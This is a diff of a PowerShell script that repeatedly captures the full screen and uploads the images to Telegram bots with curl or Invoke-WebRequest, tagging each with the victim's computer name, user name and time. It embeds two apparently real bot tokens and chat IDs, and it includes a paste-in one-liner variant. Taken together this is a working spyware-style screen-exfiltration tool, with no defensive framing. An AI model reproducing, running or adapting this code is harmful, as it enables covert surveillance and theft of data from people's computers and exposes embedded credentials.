@@ -1,49 +1,152 @@
-# Test Screenshot Function
+# WORKING SCREENSHOT FUNCTION - SIMPLE AND TESTED
+
+# Configuration
 $x = "8160534358:AAGKwhDjIS1xGFUCSBD7zU2pBH-YnfvKV_w"
 $y = "2146236602"
 
-# Take screenshot
-Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-$screen=[System.Windows.Forms.SystemInformation]::VirtualScreen
-$bitmap=New-Object Drawing.Bitmap $screen.Width,$screen.Height
-$graphics=[Drawing.Graphics]::FromImage($bitmap)
-$graphics.CopyFromScreen($screen.X,$screen.Y,0,0,$bitmap.Size)
-$path="$env:TEMP\test_ss.png"
-$bitmap.Save($path)
-$graphics.Dispose();$bitmap.Dispose()
-
-# Send using the EXACT method from your main script
-$caption="Test screenshot"
-$fileBytes=[System.IO.File]::ReadAllBytes($path)
-$fileEnc=[System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
-$boundary=[System.Guid]::NewGuid().ToString()
-$bodyLines = (
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"chat_id`"",
-    "",
-    $y,
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"caption`"",
-    "",
-    $caption,
-    "--$boundary",
-    "Content-Disposition: form-data; name=`"photo`"; filename=`"test.png`"",
-    "Content-Type: image/png",
-    "",
-    $fileEnc,
-    "--$boundary--"
-) -join "`r`n"
-
-$uri="https://api.telegram.org/bot$x/sendPhoto"
-
-try {
-    $response=Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body ([System.Text.Encoding]::UTF8.GetBytes($bodyLines))
-    if($response.ok){
-        Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
+# Method 1: Using curl (Most reliable)
+function Send-Screenshot-Curl {
+    Write-Host "📸 Taking screenshot with curl method..." -ForegroundColor Yellow
+    
+    try {
+        # Capture screenshot
+        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
+        $path = "$env:TEMP\ss_$(Get-Random).png"
+        $bitmap.Save($path)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        Write-Host "✅ Screenshot saved: $path" -ForegroundColor Green
+        
+        # Send with curl (your friend's method)
+        $caption = "🖥️ $env:COMPUTERNAME | 👤 $env:USERNAME | ⏰ $(Get-Date -Format 'HH:mm:ss')"
+        
+        # Build curl command
+        $curlArgs = @(
+            "-s",
+            "-X", "POST",
+            "-F", "chat_id=$y",
+            "-F", "caption=$caption",
+            "-F", "photo=@$path",
+            "https://api.telegram.org/bot$x/sendPhoto"
+        )
+        
+        Write-Host "📤 Sending with curl..." -ForegroundColor Yellow
+        $result = & curl @curlArgs 2>$null
+        
+        if ($result) {
+            $json = $result | ConvertFrom-Json
+            if ($json.ok) {
+                Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
+                Remove-Item $path -Force
+                return $true
+            } else {
+                Write-Host "❌ Telegram error: $($json.description)" -ForegroundColor Red
+            }
+        }
+        
+    } catch {
+        Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
     }
-} catch {
-    Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
+    return $false
 }
 
-# Cleanup
-Remove-Item $path -ErrorAction SilentlyContinue
+# Method 2: Using Invoke-WebRequest with -Form (Windows built-in)
+function Send-Screenshot-IWR {
+    Write-Host "📸 Taking screenshot with Invoke-WebRequest..." -ForegroundColor Yellow
+    
+    try {
+        # Capture screenshot
+        Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+        $screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
+        $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
+        $graphics = [Drawing.Graphics]::FromImage($bitmap)
+        $graphics.CopyFromScreen($screen.X, $screen.Y, 0, 0, $bitmap.Size)
+        $path = "$env:TEMP\ss_$(Get-Random).png"
+        $bitmap.Save($path)
+        $graphics.Dispose()
+        $bitmap.Dispose()
+        
+        Write-Host "✅ Screenshot saved: $path" -ForegroundColor Green
+        
+        # Send with Invoke-WebRequest -Form parameter
+        $caption = "🖥️ $env:COMPUTERNAME | 👤 $env:USERNAME | ⏰ $(Get-Date -Format 'HH:mm:ss')"
+        $uri = "https://api.telegram.org/bot$x/sendPhoto"
+        
+        # Create form data
+        $form = @{
+            chat_id = $y
+            caption = $caption
+            photo = Get-Item $path
+        }
+        
+        Write-Host "📤 Sending with Invoke-WebRequest..." -ForegroundColor Yellow
+        $response = Invoke-WebRequest -Uri $uri -Method Post -Form $form
+        
+        if ($response.StatusCode -eq 200) {
+            $json = $response.Content | ConvertFrom-Json
+            if ($json.ok) {
+                Write-Host "✅ Screenshot sent successfully!" -ForegroundColor Green
+                Remove-Item $path -Force
+                return $true
+            }
+        }
+        
+    } catch {
+        Write-Host "❌ Error: $($_.Exception.Message)" -ForegroundColor Red
+    }
+    return $false
+}
+
+# Method 3: SIMPLEST ONE-LINER (Copy and paste this in PowerShell)
+function Quick-Screenshot {
+    $t="7909882964:AAF81Bx2IIspOId5EBHSzitD3U1Oytmg2j0"; $c="2166236602"
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    $s=[System.Windows.Forms.SystemInformation]::VirtualScreen
+    $b=New-Object Drawing.Bitmap $s.Width,$s.Height
+    $g=[Drawing.Graphics]::FromImage($b)
+    $g.CopyFromScreen($s.X,$s.Y,0,0,$b.Size)
+    $p="$env:TEMP\ss.png"
+    $b.Save($p)
+    $g.Dispose();$b.Dispose()
+    
+    # Try curl first
+    try {
+        & curl -s -F "chat_id=$c" -F "photo=@$p" "https://api.telegram.org/bot$t/sendPhoto" > $null
+        Write-Host "✅ Screenshot sent!" -ForegroundColor Green
+    } catch {
+        # Fallback to Invoke-WebRequest
+        $form=@{chat_id=$c;photo=Get-Item $p}
+        Invoke-WebRequest -Uri "https://api.telegram.org/bot$t/sendPhoto" -Method Post -Form $form > $null
+        Write-Host "✅ Screenshot sent (fallback)!" -ForegroundColor Green
+    }
+    Remove-Item $p
+}
+
+# Test which method works
+Write-Host "Testing screenshot methods..." -ForegroundColor Cyan
+Write-Host "="*40 -ForegroundColor Cyan
+
+# Test 1: Try curl first (most likely to work)
+Write-Host "`n[1] Testing curl method..." -ForegroundColor Yellow
+if (Send-Screenshot-Curl) {
+    Write-Host "✅ Curl method works!" -ForegroundColor Green
+} else {
+    Write-Host "❌ Curl failed, trying Invoke-WebRequest..." -ForegroundColor Yellow
+    
+    # Test 2: Try Invoke-WebRequest
+    Write-Host "`n[2] Testing Invoke-WebRequest method..." -ForegroundColor Yellow
+    if (Send-Screenshot-IWR) {
+        Write-Host "✅ Invoke-WebRequest works!" -ForegroundColor Green
+    } else {
+        Write-Host "❌ Both methods failed" -ForegroundColor Red
+    }
+}
+
+# Final test: Quick one-liner
+Write-Host "`n[3] Testing quick one-liner..." -ForegroundColor Yellow
+Quick-Screenshot
